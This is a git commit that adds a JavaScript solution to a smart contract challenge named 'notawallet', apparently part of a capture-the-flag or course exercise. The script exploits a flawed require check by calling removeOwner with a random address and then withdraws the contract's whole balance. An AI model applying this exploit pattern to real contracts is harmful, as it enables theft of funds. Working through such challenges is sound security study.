930fe0be6cc22abb64060fa60d67f4a34fe2ab52
Tiago Fragoso <tiagofragoso@outlook.com>
2021-02-04 17:55:28 +0100

    Add notawallet solution

---
+++ P2/tiago-solutions/solutions/notawallet/index.js
@@ -0,0 +1,35 @@
+const fs = require("fs");
+
+const Solution = require("../Solution");
+const { NOTAWALLET_ADDR } = require("../../config/addresses");
+
+class NotAWallet extends Solution {
+    constructor() {
+        super(NOTAWALLET_ADDR);
+    }
+
+    async run() {
+        await this.unlock();
+        console.log("Running notawallet solution...");
+        await this.printBalances();
+        try {
+            const randomHex = this.w3.utils.randomHex(20);
+            const randomAddr = this.w3.utils.toChecksumAddress(randomHex);
+
+            const challengeAbi = JSON.parse(fs.readFileSync("./challenges/notawallet/NotAWallet.abi", "utf-8"));
+            const challengeContract = new this.w3.eth.Contract(challengeAbi, this.challengeAddr);
+            console.log("Exploiting require");
+            await challengeContract.methods.removeOwner(randomAddr).send({ from: this.myAddr });
+            console.log("Exploited require");
+            console.log("Withdrawing balance");
+            await challengeContract.methods.withdraw(await this.w3.eth.getBalance(this.challengeAddr)).send({ from: this.myAddr });
+            console.log("Done!");
+        } catch (err) {
+            console.error(err);
+        }
+        await this.printBalances();
+    }
+}
+
+const sol = new NotAWallet();
+sol.run();
